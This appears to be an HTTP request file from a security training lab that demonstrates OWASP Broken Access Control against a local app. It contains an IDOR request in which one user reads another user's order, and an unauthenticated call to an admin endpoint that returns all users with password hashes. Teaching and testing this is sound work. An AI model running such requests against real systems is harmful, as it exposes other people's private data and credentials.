### =============================================================
### OWASP A01 – Broken Access Control
### =============================================================
### Two attacks:
###   (a) IDOR: bob reads alice's order
###   (b) Admin endpoint without auth: anonymous access to every user
### =============================================================

@baseUrl = http://localhost:5218

# ⚠️ Paste alice's token from 00_setup.http:
@aliceToken = PASTE_ALICE_TOKEN_HERE

# ⚠️ Paste bob's token from 00_setup.http:
@bobToken = PASTE_BOB_TOKEN_HERE


### --- (a) SETUP: alice places an order ---
# Note the "id" in the response – you need it for the IDOR attack
POST {{baseUrl}}/orders
Authorization: Bearer {{aliceToken}}
Content-Type: application/json

{
  "items": [
    { "productId": 1, "quantity": 1 }
  ]
}

###

### --- (a) SETUP: bob places an order ---
# Note the "id" in the response (it should differ from alice's)
POST {{baseUrl}}/orders
Authorization: Bearer {{bobToken}}
Content-Type: application/json

{
  "items": [
    { "productId": 2, "quantity": 2 }
  ]
}

###

### --- (a) IDOR ATTACK: bob reads alice's order ---
# bob is logged in, but asks for order 1 (which belongs to alice).
# Expected (secure): 403 Forbidden
# Actual:            200 OK – bob sees alice's order ✓ VULNERABILITY
#
# Why? GET /orders/{id} never checks whether the order belongs to the caller.
GET {{baseUrl}}/orders/1
Authorization: Bearer {{bobToken}}

###

### --- (b) Admin endpoint without auth ---
# No token, no login – and still every user comes back, password hashes included.
# Expected (secure): 401 Unauthorized
# Actual:            200 OK – the complete user list ✓ VULNERABILITY
#
# Why? The endpoint has no authorization requirement at all.
GET {{baseUrl}}/admin/users
